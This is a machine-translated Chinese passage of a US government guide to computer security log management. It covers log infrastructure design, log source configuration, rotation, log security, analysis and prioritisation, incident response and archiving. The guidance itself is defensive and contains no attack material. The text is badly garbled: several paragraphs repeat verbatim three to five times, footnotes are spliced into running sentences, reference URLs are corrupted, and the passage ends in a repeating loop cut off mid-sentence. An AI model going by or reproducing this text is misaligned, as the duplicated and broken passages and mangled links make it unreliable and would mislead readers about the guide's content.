兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載 兩種典型的自定義環境是專用安全受限功能和遺留： – 專用安全受限功能環境包含遭受攻擊或數據暴露的高風險的系統和網絡，安全優先於功能。他們假設系統在高度威脅的環境中具有有限或專門的功能（不是通用工作站或系統），例如面向外的防火牆或公共 Web 服務器，或者其數據內容或任務目的具有如此價值，以至於 51 NIST SP 800-70 可從以下網址下載http://清單nist.gov/. 4-8 計算機安全日誌管理指南 有利於安全的激進權衡勝過對其他有用系統屬性（例如與其他系統的互操作性）的潛在負面影響。由於這樣做存在潛在的安全風險（例如，運行額外的網絡服務、通過網絡傳輸未受保護的敏感信息），某些專用安全性有限功能係統參與日誌管理基礎設施的能力可能有限。可能有必要設計一個日誌管理基礎設施，以便這些系統在本地執行所有日誌管理，或者它們的日誌通過帶外方式（例如可移動媒體）傳輸到基礎設施。- 遺產。Legacy 環境包含較舊的系統或應用程序，它們可能使用較舊的、不太安全的通信機制。在遺留環境中運行的其他機器可能需要限制較少的安全設置，以便它們可以與遺留系統和應用程序通信。某些遺留系統可能無法參與日誌管理基礎架構，因為無法在其上正確安裝或配置必要的軟件。可能有必要設計一個日誌管理基礎設施，以便這些系統在本地執行所有日誌管理，或者它們的日誌通過帶外方式（例如可移動媒體）傳輸到基礎設施。4.4 設計日誌管理基礎設施 在建立初始策略並確定角色和職責後，組織接下來應該設計一個或多個日誌管理基礎設施來有效支持策略和角色。如果組織已經有了日誌管理基礎設施，那麼組織應該首先確定是否可以對其進行修改以滿足組織的需要。如果現有基礎設施不合適，或者不存在這樣的基礎設施，那麼組織應該要么確定其基礎設施要求，評估可能的解決方案，並實施所選擇的解決方案（硬件、軟件和可能的網絡增強），要么重新評估其需求並修改其政策。組織可能希望創建策略草案，嘗試設計相應的日誌管理基礎架構，並確定策略的哪些方面使其不可行。然後，該組織可以修改其政策，以便基礎設施實施的資源密集度較低，同時確保仍然滿足所有法律和法規要求。由於日誌管理的複雜性，可能需要幾個週期的策略修改、基礎設施設計和設計評估才能最終確定策略和設計。在設計日誌管理基礎架構時，組織應考慮與基礎架構和整個組織的各個日誌源的當前和未來需求相關的幾個因素。主要因素包括： � 每小時和每天要處理的日誌數據的典型和峰值量。大多數日誌源的典型日誌數據量往往會隨著時間的推移而增加。峰值量應包括處理極端情況，例如廣泛的惡意軟件事件、漏洞掃描、和滲透測試，可能會導致在短時間內生成異常大量的日誌條目。如果日誌數據量太大，可能會導致日誌記錄拒絕服務。許多日誌記錄產品根據它們在給定時間內可以處理的事件量來評估它們處理日誌數據的能力，通常以每秒事件數 (EPS) 為單位。� 網絡帶寬的典型和峰值使用情況。� 在線和離線（例如歸檔）數據存儲的典型和峰值使用。這應該包括分析執行備份和日誌數據歸檔所需的時間和資源，以及在不再需要數據時對其進行處理。4-9 計算機安全日誌管理指南 � 日誌數據的安全需求。例如日誌數據在系統間傳輸時需要加密，這可能需要係統進行更多處理，並增加網絡帶寬的使用。� 員工分析日誌所需的時間和資源。4.5 總結 為了建立和維護成功的日誌管理基礎設施，組織應該為執行日誌管理執行重要的計劃和其他準備行動。這對於創建滿足組織需求和要求並為組織提供額外價值的一致、可靠和高效的日誌管理實踐非常重要。作為日誌管理規劃過程的一部分，組織應該定義預期參與日誌管理的個人和團隊的角色和職責。系統和網絡管理員通常負責在他們的系統和網絡設備上配置日誌記錄，定期分析這些日誌，報告日誌管理活動的結果，並對日誌和日誌記錄軟件進行定期維護。安全管理員通常負責管理和監控日誌管理基礎設施、在安全設備上配置日誌記錄、報告日誌管理活動的結果以及協助其他人進行日誌管理。組織內的許多其他人也可能具有日誌管理角色，例如事件處理程序、應用程序開發人員、審計員和管理人員。角色和職責的分配應考慮在系統級別和基礎架構級別執行分析的好處。系統級管理員需要得到組織足夠的支持，如培訓、信息傳播機制、技術指導、日誌管理工具等。組織應定義其執行日誌記錄和監視日誌的要求和目標。基於該決定，組織應制定明確定義強制性要求的政策，並為日誌管理的幾個方面提出建議，包括日誌生成、傳輸、存儲、處置和分析。組織還應確保與日誌記錄有某種關係的其他政策、指南和程序包含並支持這些日誌管理要求和建議，並且還符合功能和操作要求。組織的政策和程序還應解決與日誌記錄相關的法律問題，例如可能需要作為證據的原始日誌文件的保存。組織應定期審查其與日誌記錄相關的政策，並根據需要進行更新。創建日誌記錄的要求和建議需要結合對實施和維護它們所需的技術和資源、它們的安全影響和價值以及組織所遵守的法規和法律的分析來完成。通常，組織應該只要求記錄和分析最重要的數據，並且如果時間和資源允許的話，還應該記錄和分析其他類型的數據的非強制性建議。在某些情況下，組織選擇生成所有或幾乎所有日誌數據並至少在短時間內存儲，以備不時之需；這種方法有利於安全性而不是可用性和資源使用。在建立初始策略並確定角色和職責後，組織接下來應該設計一個或多個日誌管理基礎架構，以有效支持該策略和角色。在設計基礎架構時，組織應考慮整個組織中基礎架構和各個日誌源的當前和未來需求。設計中要考慮的主要因素包括要處理的日誌數據量、網絡帶寬、在線和離線數據存儲、數據的安全需求以及人員分析日誌所需的時間和資源。4-10 計算機安全日誌管理指南 5. 日誌管理操作流程 系統級和基礎架構管理員應遵循標準流程來管理他們負責的日誌。本節描述了日誌管理的主要操作流程，如下所示： �配置日誌源，包括日誌生成、存儲和安全 �執行日誌數據分析 �對識別的事件發起適當的響應 �管理長期存儲日誌數據。本節描述了其中的每一個過程，並提供了執行這些過程的指導。它還簡要討論了系統級和基礎架構管理員應執行的其他操作過程。該部分還描述了對日誌管理操作執行定期審計的需要。本節中的指南基於組織已經設計和部署了一個或多個日誌管理基礎架構的假設。5.1 配置日誌源 系統級管理員需要配置日誌源，以便他們以所需的格式和位置捕獲必要的信息，並在適當的時間段內保留信息。配置日誌源通常是一個複雜的過程。首先，管理員需要根據組織的政策確定他們的哪些主機和主機組件必須或應該參與日誌管理基礎設施。單個日誌文件可能包含來自多個來源的信息，例如包含來自操作系統本身和多個安全軟件程序和應用程序的信息的操作系統日誌。管理員應確定哪些日誌源使用每個日誌文件。52 接下來，對於每個已識別的日誌源，管理員需要確定每個日誌源必須或應該記錄哪些類型的事件，以及每種類型必須或應該記錄哪些數據特徵event.53 管理員配置每個日誌源的能力取決於該特定類型的日誌源提供的功能。例如，一些日誌源提供非常細粒度的配置選項，而一些則根本不提供細粒度——日誌記錄只是簡單地啟用或禁用，無法控制記錄的內容。本節從日誌生成、日誌存儲和處置、日誌安全三個方面討論日誌源配置。5.1.1 管理員需要確定每個日誌源必須或應該記錄哪些類型的事件，以及每種類型的事件必須或應該記錄哪些數據特徵。 53 管理員配置每個日誌源的能力取決於該日誌源提供的功能特定類型的日誌源。例如，一些日誌源提供非常細粒度的配置選項，而一些則根本不提供細粒度——日誌記錄只是簡單地啟用或禁用，無法控制記錄的內容。本節從日誌生成、日誌存儲和處置、日誌安全三個方面討論日誌源配置。5.1.1 管理員需要確定每個日誌源必須或應該記錄哪些類型的事件，以及每種類型的事件必須或應該記錄哪些數據特徵。 53 管理員配置每個日誌源的能力取決於該日誌源提供的功能特定類型的日誌源。例如，一些日誌源提供非常細粒度的配置選項，而一些則根本不提供細粒度——日誌記錄只是簡單地啟用或禁用，無法控制記錄的內容。本節從日誌生成、日誌存儲和處置、日誌安全三個方面討論日誌源配置。5.1.1 53 管理員配置每個日誌源的能力取決於特定類型的日誌源提供的功能。例如，一些日誌源提供非常細粒度的配置選項，而一些則根本不提供細粒度——日誌記錄只是簡單地啟用或禁用，無法控制記錄的內容。本節從日誌生成、日誌存儲和處置、日誌安全三個方面討論日誌源配置。5.1.1 53 管理員配置每個日誌源的能力取決於特定類型的日誌源提供的功能。例如，一些日誌源提供非常細粒度的配置選項，而一些則根本不提供細粒度——日誌記錄只是簡單地啟用或禁用，無法控制記錄的內容。本節從日誌生成、日誌存儲和處置、日誌安全三個方面討論日誌源配置。5.1.1

日誌生成 假設日誌源提供配置選項，在選擇初始日誌記錄設置時通常謹慎行事。54 單個設置可能會導致記錄大量日誌條目，或者為每個條目記錄太多信息事件。過多的日誌記錄會導致日誌數據丟失，以及系統運行緩慢甚至拒絕服務等操作問題。系統級管理員不僅需要考慮日誌源配置可能產生的影響 52 在某些情況下，如果不在生產環境中運行主機並監控實際日誌，可能很難識別所有日誌源。53 對於使用安全配置清單的常見主機實現，組織應該發現修改清單以包括日誌源配置是有效的。54 這最適用於源記錄的最初幾天。如果使用不太保守的設置會導致嚴重問題，則只能長時間使用保守設置。5-1 計算機安全日誌管理指南 日誌主機，以及其他日誌管理基礎結構組件——例如，過多的日誌記錄會導致網絡帶寬和集中日誌存儲的使用顯著增加。對於管理員不完全熟悉的日誌源配置，管理員可能會選擇在非生產環境中對其進行測試，然後再將其部署到任何生產系統。特別推薦最常見的日誌源，關鍵主機上的日誌源，以及最重要的日誌源。軟件供應商和其他各方也可能擁有有關日誌記錄功能和各種日誌記錄設置的典型效果的可用信息，這對於確定初始配置非常有幫助。 55 5.1.2

日誌存儲和處置 系統級管理員需要確定每個日誌源應如何存儲其數據。這應該主要由有關日誌存儲的組織策略驅動，特別是將條目轉發到日誌管理基礎結構的要求。一旦滿足這些要求，管理員通常就可以在其他日誌存儲設置方面擁有很大的靈活性。日誌條目的存儲選項如下： 不存儲。被確定為對組織價值很小或沒有價值的條目，例如只能由軟件供應商理解的調試消息，或不記錄任何活動細節的錯誤消息，通常不需要存儲。� 僅系統級。對系統級管理員可能有一定價值或興趣的條目，但不夠重要，不能發送到日誌管理基礎設施，應該存儲在系統上。例如，如果發生事故，附加的系統級日誌條目可能會提供與該事故相關的一系列事件的更多信息。系統級管理員可能還會發現查看這些條目有助於製定典型活動的基線並確定長期趨勢。� 系統級和基礎設施級。被視為特別感興趣的條目應保留在系統上，並傳輸到日誌管理基礎設施。在兩個位置都有日誌的原因包括： – 如果系統或基礎設施日誌記錄失敗，另一個應該仍然有日誌數據。例如，如果日誌服務器發生故障或網絡故障導致日誌記錄主機無法與其聯繫，則記錄到系統有助於確保日誌數據不丟失。– 在系統發生事件期間，系統的日誌可能會被攻擊者更改或破壞；然而，通常攻擊者將無法訪問基礎設施日誌。事件響應人員可以使用基礎設施日誌中的數據；此外，他們還可以比較基礎架構和系統日誌以確定更改或刪除了哪些數據，這可能表明攻擊者想要隱藏的內容。55 Windows 2000 Professional 和 Windows XP Professional 的日誌記錄設置和審核策略示例可從 NIST SP 800-43、用於保護 Microsoft Windows 2000 Professional 系統的系統管理指南和 NIST SP 800-68 獲得，為 IT 專業人員保護 Microsoft Windows XP 系統的指南：NIST 安全配置清單。這兩份出版物都可以從http://csrcnist.gov/publications/nistpubs/。5-2 計算機安全日誌管理指南——系統或特定係統的安全管理員通常負責分析其日誌，但不負責分析其在基礎設施日誌服務器上的日誌數據。56 因此，系統日誌需要包含所有數據系統級管理員的興趣。� 僅基礎設施層面。如果日誌存儲在基礎架構服務器上，通常最好也將它們存儲在系統級別。然而，這並不總是可行的，例如日誌容量很小的系統或無法在本地存儲日誌的日誌源（例如，只能登錄到遠程日誌服務器的應用程序）。配置日誌源以將條目存儲在必要的位置，以及將條目傳輸到日誌管理基礎設施，可能會很棘手。正如 5.1 節開頭提到的，日誌源的可定制性差異很大。示例如下： � 有些只能記錄到單個系統日誌文件。日誌管理基礎設施通常支持常見的日誌文件格式，例如逗號分隔或製表符分隔的值、系統日誌和數據庫。一些基礎設施還支持最流行的專有日誌格式。如果基礎設施軟件不支持日誌格式，系統級管理員可能需要獲取可以定期運行的日誌轉換程序，以將日誌轉換為基礎設施可以使用的格式。如果這不是一個選項，那麼管理員可能必須對日誌進行定期的手動審查，並且日誌內容不會被發送到基礎架構服務器。以專有格式存儲數據的日誌源通常提供日誌查看器或分析工具來幫助管理員執行分析。� 有些可以使用多種類型的系統日誌，例如專有格式日誌或標準格式日誌（例如，系統日誌）。在許多情況下，日誌並不包含所有相同的數據；專有格式日誌通常包含比標準格式日誌更多的數據字段。一些日誌源的一種選擇是同時將數據發送到多個系統日誌。這允許系統級管理員使用專有格式日誌執行他們的分析，同時以標準格式為日誌管理基礎架構提供大部分數據。� 有些可以同時在系統級別和基礎設施級別進行記錄。對於某些日誌源，甚至可以指定哪些類型的日誌條目應該發送到每個源，而不是將相同的條目發送到每個日誌源。本地日誌輪轉是配置日誌源的另一個重要部分。系統級和基礎架構管理員應配置所有日誌源以執行日誌輪換，最好在固定時間（例如，每小時、每天、每週）和達到最大日誌大小時（例如，1 兆字節 [MB]、10 MB , 100 MB).57 如果日誌源不提供日誌輪換功能，管理員可能需要為日誌部署單獨的日誌輪換實用程序或腳本。一些日誌源不適合第三方日誌輪換，例如一些專有格式的日誌。在這些情況下，日誌源通常會為管理員提供日誌變滿時的操作選項，例如：停止日誌記錄。這通常是一個不可接受的選項，因為它允許操作在不允許監視相關安全事件的情況下繼續進行。

56 一些組織允許系統級管理員訪問存儲在日誌管理基礎設施日誌服務器上的系統日誌數據。這最常發生在無法在本地記錄或無法將日誌信息保留超過短時間的系統。57 管理員應該意識到日誌輪換並不總是乾淨利落地執行。輪轉日誌時正在進行的事件可能會將其關聯的日誌條目拆分為兩個日誌文件。在某些情況下，日誌源可能會繼續為已經在進行中的事件更新舊日誌，因此歸檔日誌文件實際上可能會在一段時間內繼續更改，通常是幾分鐘。5-3 計算機安全日誌管理指南 覆蓋最舊的條目。這對於較低優先級的日誌源通常是可以接受的，特別是當重要的日誌條目已經傳輸到日誌服務器或存檔到離線存儲時。對於很難輪換的日誌，這通常也是最好的方法。� 停止日誌生成器。當日誌記錄很重要時，可能需要將操作系統、安全軟件或生成日誌的應用程序配置為在沒有剩餘空間用於更多日誌條目時關閉。在這樣的系統上，管理員應該採取合理的措施來確保日誌生成器有足夠的空間來存儲它們的日誌，並且密切監視日誌的使用情況。許多這些日誌源還可以在日誌快滿時（通常是預定閾值，例如 80% 或 90% 滿）和日誌完全滿時再次提醒管理員。這對任何日誌源都有幫助，但對於填充緩慢的日誌最有效——第一個日誌變滿的警告可能會在日誌完全變滿前幾天發送，讓管理員有足夠的時間歸檔任何需要的日誌條目，然後清除日誌。基礎設施和系統級管理員還負責確保將舊日誌存檔適當的時間長度，然後在不再需要時銷毀，以符合組織的日誌記錄、數據保留和媒體清理政策。 58 如果大量日誌需要保存在系統上以加快分析或出於其他原因，管理員可能需要為歸檔日誌獲取額外的存儲設備（例如，硬盤驅動器）。如果不再需要仍在系統上的舊日誌數據，因為它不重要或已經存檔，通常通過刪除舊日誌文件或執行日誌清除以刪除特定日期和時間之前的所有條目來處理它。許多日誌源提供日誌清除功能。5.1.3

日誌安全 基礎架構和系統級管理員需要保護日誌數據的完整性和可用性，並且通常還需要保護其機密性。第 5.1.2 節描述了支持可用性的日誌存儲和歸檔實踐。保護系統日誌、存儲日誌和傳輸日誌的其他安全注意事項包括： 限制對日誌文件的訪問。除非創建日誌條目需要某種級別的訪問權限，否則用戶不應具有對大多數日誌文件的任何訪問權限。如果是這樣，用戶應該具有僅追加權限，並且盡可能沒有讀取權限。用戶不應該能夠對日誌文件進行重命名、刪除或執行其他文件級操作。� 避免記錄不需要的敏感數據。一些日誌可能會記錄不需要記錄的敏感數據，例如密碼。在可行的情況下，日誌記錄應配置為不記錄不需要的信息，如果未經授權的各方訪問會帶來重大風險。� 保護存檔的日誌文件。這可能包括為文件創建和保護消息摘要、加密日誌文件以及為歸檔媒體提供充分的物理保護。� 保護生成日誌條目的進程。未經授權的各方不應能夠操縱日誌源進程、可執行文件、配置文件或可能影響日誌記錄的日誌源的其他組件。� 將每個日誌源配置為在發生日誌記錄錯誤時採取適當的行為。例如，對於特定的日誌源，日誌記錄可能被認為非常重要，以至於日誌源應該是 58 在許多情況下，可能只需要歸檔一些舊條目。管理員可能會選擇執行日誌過濾，以便只歸檔必要的數據。這通常會減少存檔所需的時間和存儲介質。5-4 計算機安全日誌管理指南配置為在日誌記錄失敗時完全暫停其功能。另一個例子是處理完整的日誌文件，如第 5.1.2 節所述。� 實施安全機制，將日誌數據從系統傳輸到中央日誌管理服務器，如果需要這種保護並且日誌管理基礎設施不能自動提供的話。許多傳輸協議，例如 FTP 和超文本傳輸協議 (HTTP)，不提供保護。管理員可能需要將系統的日誌記錄軟件升級到具有附加安全功能的版本，或者通過單獨的協議（如 Internet 協議安全 (IPsec) 或 SSL）對日誌記錄通信進行加密。5.2 分析日誌數據 日誌數據的有效分析通常是日誌管理中最具挑戰性的方面，但通常也是最重要的。儘管有時管理員認為分析日誌數據無趣且效率低下（例如，付出很多努力也沒有多大價值），但擁有強大的日誌管理基礎架構並儘可能多地自動化日誌分析過程可以顯著改進分析，從而減少分析時間執行並產生更有價值的結果。本節提供了有關了解日誌和確定日誌條目優先級的建議，還比較了系統級和基礎架構級分析。5.2. 1 了解日誌 執行日誌分析的關鍵是了解與每個系統相關的典型活動。儘管有些日誌條目很容易理解，但很多卻不是。這樣做的主要原因如下： � 需要上下文。條目的含義通常取決於它周圍的上下文。管理員需要確定此上下文是如何定義的，例如通過一個或多個日誌中的附加日誌條目，或通過非日誌源（例如，配置管理記錄）。需要上下文來驗證不可靠的日誌條目，例如在尋找惡意活動時經常產生誤報的安全軟件。基礎架構管理員應根據需要聯繫系統級管理員，以幫助提供條目的上下文。不清楚的消息。日誌條目可能包含對軟件供應商有意義但對查看條目的管理員沒有意義的神秘消息或代碼。此類條目可能需要與軟件供應商討論以確定其含義。使用 SIEM 軟件分析日誌通常會減少不明確消息的數量，因為 SIEM 軟件通常對軟件供應商的日誌記錄實踐有詳細的了解。然而，即使是 SIEM 軟件也無法理解每條消息，例如與剛剛發布的產品更新相關的新消息類型。在某些情況下，可能無法完全了解日誌條目。例如，日誌源可能無法記錄為條目提供足夠上下文所需的支持數據。還，軟件供應商可能無法提供有關特定消息含義的足夠詳細的信息。雖然管理員最好了解所有日誌條目，但在許多情況下根本不可行。此外，可能有許多不同類型的日誌條目，以致於利用有限的可用資源不可能完全理解它們。深入了解日誌數據的最有效方法是定期（例如，每天）查看和分析其中的部分內容。目標是最終了解典型日誌條目的基線，可能包含系統上的絕大多數日誌條目。（因為一些類型的條目通常佔日誌條目的很大一部分，這並不像最初 5-5 計算機安全日誌管理指南聽起來那麼困難。）每日日誌審查應包括那些被認為最可能重要的條目，以及一些尚未完全確定的條目明白了。因為了解大多數日誌條目的重要性可能需要付出相當大的努力，所以執行日誌分析過程的最初幾天、幾週甚至幾個月是最具挑戰性和最耗時的。隨著時間的推移，隨著正常活動的基線加寬和加深，每日日誌審查應該花費更少的時間，並更專注於最重要的日誌條目，從而產生更有價值的分析結果。了解日誌條目的另一個動機是盡可能使分析過程自動化。通過確定哪些類型的日誌條目感興趣，哪些不感興趣，管理員可以配置日誌條目的自動過濾。 59 這允許自動識別和響應已知的惡意事件（例如，提醒管理員，重新配置其他安全控制） ). 過濾的另一個目的是確保管理員執行的手動分析具有適當的優先級。應配置過濾，以便為管理員提供合理數量的條目以供手動分析。一種有效的技術是製作兩份報告：一份針對被認為最重要的條目，另一份針對尚未完全理解的條目。兩份報告都應定期審查，但第一份報告的優先級應高於第二份報告。如果不經常執行第二份報告的審查，則日誌記錄基線可能無法充分擴展和細化。5.2.2

確定日誌條目的優先級 確定日誌條目分析的優先級可能具有挑戰性。儘管一些日誌源為每個條目分配了自己的優先級，但這些優先級通常使用不一致的尺度或等級（例如，高/中/低、1 到 5、1 到 10），這使得比較優先級值具有挑戰性。此外，不同產品用於確定條目優先級的標準可能基於不同的要求集，其中一些或全部可能與組織的要求不一致。因此，組織應考慮根據多種因素的組合為日誌條目分配自己的優先級，包括以下因素：條目類型（例如，消息代碼 103，消息類別 CRITICAL）條目類型的新穎性（即，這種類型的條目以前是否出現在日誌中？） 日誌源 源或目標 IP 地址（例如，黑名單上的源地址、關鍵系統的目標地址、涉及特定 IP 地址的先前事件） 一天中的時間或星期幾（例如，在某些時間輸入可能是可接受的，但在其他時間不允許輸入）輸入的頻率（例如，在 y 秒內輸入 x 次）。優先級排序還可能包括使用相關性為日誌條目提供上下文，以便對它們進行驗證。例如，假設基於主機的入侵檢測軟件監視系統上明顯的文件修改攻擊。如果主機的操作系統日誌包含一個審計條目，表明文件被成功修改，並且來自兩個日誌條目的數據關聯在一起，與單獨使用任何一個日誌源相比，它可以為攻擊成功提供更有力的保證，而且它還可能包含比任何一個單獨源記錄的更多的攻擊數據。另一個使用相關性作為優先級因素的例子是使用 59 中已知漏洞的信息 如第 3.1 節所述，過濾不會改變原始日誌的內容——它只是限制哪些日誌條目用於分析。出於多種原因，可能需要原始日誌數據中的過濾條目，包括為其他條目提供上下文以及通過趨勢分析識別長期安全問題。5-6 計算機安全日誌管理指南 組織安裝的操作系統和應用程序為與這些漏洞相關的日誌條目分配更高的優先級。5.2.3

比較系統級和基礎設施級分析 對於系統級和基礎設施管理員來說，分析通常非常相似。主要區別在於，對於基礎架構管理員而言，日誌分析通常是主要職責，而對於系統級管理員而言，它通常是次要職責，尤其是當基礎架構管理員正在審查系統中最重要的日誌條目時。在這樣的安排中，基礎設施管理員通常每天持續地執行日誌分析，而係統級管理員執行與每個系統及其信息的關鍵性相稱的定期審查（例如，每天、每週）。還，與系統級管理員相比，基礎架構管理員可能可以訪問更複雜的工具，因為讓所有系統都可以使用這些工具成本過高。無論在基礎架構級別執行多少分析，系統級別管理員通常需要對以下類型的條目執行分析：相對優先級 無法自動參與基礎設施的日誌源的條目（例如，不尋常的專有格式、獨立系統、遺留系統、設備） 沒有僅在系統級別可用的上下文就無法理解的條目。系統級管理員通常可以使用各種工具和技術來執行審查和分析。在某些系統上，特別是那些有很多日誌源的系統，建立一個本地日誌基礎設施並將來自系統所有日誌源的數據存儲在那裡是有效的。在其他系統上，尤其是對於專有日誌格式，管理員可能會使用特定於格式的日誌查看器、簡化工具和其他實用程序對每個日誌源進行單獨分析。另一種可能性是將日誌數據導出到數據庫並在數據庫上執行查詢。數據庫查詢可能是出於分析目的過濾日誌數據的絕佳方式。60 如果大部分分析過程可以自動化，那麼每天創建一份分析報告並將其提交給管理員審查可能是可行的。管理員可以根據需要對報告識別的重要事件進行進一步調查。為了執行有效的審查和分析，系統級和基礎設施管理員應該通過培訓或實踐經驗對以下各項有充分的了解： 組織關於可接受使用的政策，以便管理員能夠識別違反政策的行為 安全主機使用的軟件，包括每個程序可以檢測到的安全相關事件的類型和每個程序的一般檢測配置文件（例如，已知的誤報）操作系統和主要應用程序（例如，電子郵件、Web）被他們的主人使用，特別是每個操作系統和主要應用程序的安全性和日誌記錄功能和特性 60 數據庫查詢可能會出現嚴重的性能問題，特別是如果數據庫包含大量事件、架構設計不佳或維護不善時。查詢的複雜性也會對執行查詢所需的時間產生重大影響。在某些日誌事件數據庫中，單個查詢可能需要運行數小時。5-7 計算機安全日誌管理指南 常見攻擊技術的特徵，特別是如何在每個系統上記錄這些技術的使用 執行分析所需的軟件，例如日誌查看器、日誌縮減腳本和數據庫查詢工具。組織通常需要係統級管理員向基礎設施管理員報告他們的分析結果。這有助於確保系統級管理員定期執行日誌分析。報告中的信息對基礎架構管理員也很有價值，因為他們可以查看這些信息並識別在單個系統級別無法看到的活動模式。例如，基礎架構管理員可以看到在多個系統上嘗試進行相同的攻擊。基礎架構管理員還可以將從分析報告中獲得的信息傳播給系統級管理員，以便他們可以更輕鬆地識別自己系統上的類似活動。基礎設施管理員還應該創建總結他們自己的分析活動結果的報告，並且可能還總結來自系統級管理員的報告。定期與管理層分享報告的亮點，特別是作為分析工作的結果發現和糾正的問題，展示了日誌管理對組織管理的好處。5.3 響應已識別的事件 在他們的日誌分析過程中，基礎架構和系統級管理員可能會識別需要某種響應的重要事件，例如事件和操作問題。當管理員根據組織的事件響應策略確定可能的計算機安全事件時，管理員應遵循組織的事件響應程序，以確保它得到適當處理。計算機安全事件的示例包括主機被惡意軟件感染和人員獲得對主機的未授權訪問。管理員應對非事件事件做出自己的響應，例如輕微的操作問題（例如，主機安全軟件配置錯誤）。一些組織要求系統級管理員向基礎架構管理員報告事件和與日誌記錄相關的操作問題，以便基礎架構管理員可以更好地識別在單個系統級別無法看到的相同活動和模式的其他實例。基礎架構和系統級管理員還應準備好協助事件響應團隊的工作。例如，當事件發生時，受影響的系統級管理員可能會被要求查看他們的系統日誌以查找惡意活動的特定跡象，或者將他們的日誌副本提供給事件處理程序以供進一步分析。作為響應的一部分，管理員還應準備好更改其日誌記錄配置。諸如蠕蟲之類的不良事件通常會導致異常大量的事件被記錄下來。這可能會導致各種負面影響，例如降低系統性能、壓倒日誌記錄進程以及覆蓋最近的日誌條目。分析師可能看不到其他重要事件，因為他們的記錄隱藏在所有其他日誌條目中。因此，管理員可能需要根據日誌數據的來源重新配置短期、長期或永久的日誌記錄，以防止它淹沒系統和日誌。管理員可能還需要調整日誌記錄以捕獲更多數據作為響應工作的一部分，例如收集有關特定類型活動的額外信息。為識別類似事件，尤其是在短期內，管理員可能需要執行額外的日誌監控和分析，例如更仔細地檢查記錄初始事件相關信息的日誌源類型。5-8 計算機安全日誌管理指南 5.4 管理長期日誌數據存儲 管理員通常負責管理其日誌的存儲。他們應該了解組織對日誌數據存儲的要求和指南，以便將日誌保留規定的時間段。如果日誌數據已經傳輸到日誌管理基礎架構，系統級管理員可能不需要對日誌數據進行任何長期存儲。如果管理員需要將日誌數據存儲一段保留期，而這段時間相對較短（幾天或幾週），則將它們保持在線並在定期系統備份中捕獲它們可能就足夠了。如果保留期相對較長（數月或數年），管理員通常需要執行以下操作： 為要歸檔的數據選擇一種日誌格式。如果日誌採用專有格式，管理員應確定日誌是否應以該格式、標準格式或兩者歸檔。多年後可能很難閱讀專有格式的日誌（例如，生成它的軟件不再可用或不再支持該格式）。但是，專有格式日誌可能包含標準格式日誌中不存在的其他和更詳細的信息，因此如果有足夠的存檔存儲空間可用，以專有格式和標準格式存檔此類日誌可能很有價值。� 歸檔日誌數據。可能的媒體格式選擇包括備份磁帶、CD、DVD、存儲區域網絡 (SAN) 和專用日誌歸檔設備或服務器。選擇媒體格式時，管理員應注意數據的保留期限。如果特定類型的媒體只打算持續五年，而日誌數據需要保留更長的時間，要么選擇另一種媒體，要么制定計劃在未來五年內將數據從一種媒體轉移到另一種媒體。管理員還應該考慮訪問媒體所需的硬件和軟件在保留期結束時是否仍然可用。管理員應定期檢查存檔媒體的格式，以確定是否有任何內容可能無法訪問，然後將任何此類數據從一種媒體傳輸到另一種媒體。驗證傳輸日誌的完整性。如第 3.1 節所述，這通常是通過為每個日誌文件創建消息摘要來完成的。如果更改日誌文件並重新計算其消息摘要，則新消息摘要將與舊消息摘要不匹配。管理員應該將每個原始日誌的消息摘要與日誌文件的每個副本的消息摘要進行比較，以確保文件在傳輸過程中沒有被更改。� 安全地存儲媒體。管理員有責任確保媒體得到充分的實物保護。其中的第一個組成部分是防止未經授權的物理訪問，這通常涉及將媒體保存在安全區域並監控對安全區域的訪問。物理保護的第二個組成部分是確保適當的環境控製到位，例如濕度和溫​​度控制，以及防水、防磁和其他可能損壞介質的東西。此外，存檔媒體通常存儲在異地設施中。管理員還負責確保在所需的數據保留期結束時正確銷毀歸檔日誌。這包括存儲在系統上的日誌、定期備份和存檔媒體。管理員在銷毀日誌時應遵循其組織的媒體清理政策和程序。日誌可能如何被銷毀的示例包括邏輯銷毀 5-9 計算機安全日誌管理指南銷毀（例如，用隨機值反复覆蓋數據）和物理銷毀（例如，粉碎媒體、對硬盤驅動器消磁）。61 5.5 提供其他操作支持除了本節前面描述的操作流程外，基礎架構和系統級管理員還需要為日誌操作提供其他類型的支持。他們應該定期執行以下操作：監控所有日誌源的日誌記錄狀態，以確保每個源都已啟用、正確配置並按預期運行。� 監控日誌輪轉和歸檔過程，以確保正確歸檔和清除日誌，並在不再需要舊日誌時將其銷毀。日誌輪轉監控還應包括通過自動或手動方式定期檢查日誌可用的剩餘空間。62 檢查日誌軟件的升級和補丁；獲取、測試和部署更新。確保每個系統的時鐘同步到一個公共時間源，以便其時間戳與其他系統生成的時間戳相匹配。� 根據需要根據策略更改、審計結果、技術更改和新的安全需求等因素重新配置日誌記錄。� 記錄在日誌設置、配置和流程中檢測到的異常情況。此類異常可能表示惡意活動、政策和程序的偏差以及日誌記錄機制中的缺陷。系統級管理員應向基礎架構管理員報告異常情況。5.6 執行測試和驗證組織應定期執行測試和驗證活動，以確認在整個組織的基礎設施級別和系統級別都正確遵循了組織的日誌記錄策略、流程和程序。日誌管理審計可以識別政策、程序、技術和培訓方面的缺陷，然後加以解決。審計也有助於確定有效的做法，例如特定的配置或過濾設置，這可能對在其他系統上使用有益。用於測試和驗證日誌記錄的最常見技術如下： 被動。審計員或其他執行測試和驗證的人員可以審查日誌記錄配置和設置，以及系統日誌、基礎設施日誌和存檔日誌，以獲取系統和基礎設施服務器的代表性樣本，以確保它們符合政策和程序。活躍。審計員（或在審計員指導下的安全管理員）或其他執行測試和驗證的人員可以通過以下方式在具有代表性的系統樣本上創建安全事件 以及系統日誌、基礎設施日誌和存檔日誌，用於系統和基礎設施服務器的代表性抽樣，以確保它們符合政策和程序。活躍。審計員（或在審計員指導下的安全管理員）或其他執行測試和驗證的人員可以通過以下方式在具有代表性的系統樣本上創建安全事件 以及系統日誌、基礎設施日誌和存檔日誌，用於系統和基礎設施服務器的代表性抽樣，以確保它們符合政策和程序。活躍。審計員（或在審計員指導下的安全管理員）或其他執行測試和驗證的人員可以通過以下方式在具有代表性的系統樣本上創建安全事件

